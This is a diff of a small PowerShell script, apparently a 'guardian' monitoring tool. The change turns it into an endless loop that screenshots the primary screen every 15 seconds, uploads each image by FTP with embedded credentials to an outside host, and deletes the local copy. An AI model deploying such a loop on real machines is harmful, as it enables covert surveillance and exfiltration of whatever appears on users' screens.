@@ -1,4 +1,5 @@
-
+ while( 1 )
+   {
     $file = (Get-Date).ToString("yyyyMMddhhmm")+".bmp"
     $path="c:\temp\"
     $b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
@@ -14,3 +15,8 @@
     $client = New-Object System.Net.WebClient
     $client.Credentials = New-Object System.Net.NetworkCredential($user, $password)
     $client.UploadFile("ftp://ftp.iesjoseplanes.es/guardian/" + $file, $path + $file )
+
+    $archive =  $path + $file   
+    Remove-Item -Path  $archive –recurse
+    Start-Sleep -s 15
+}
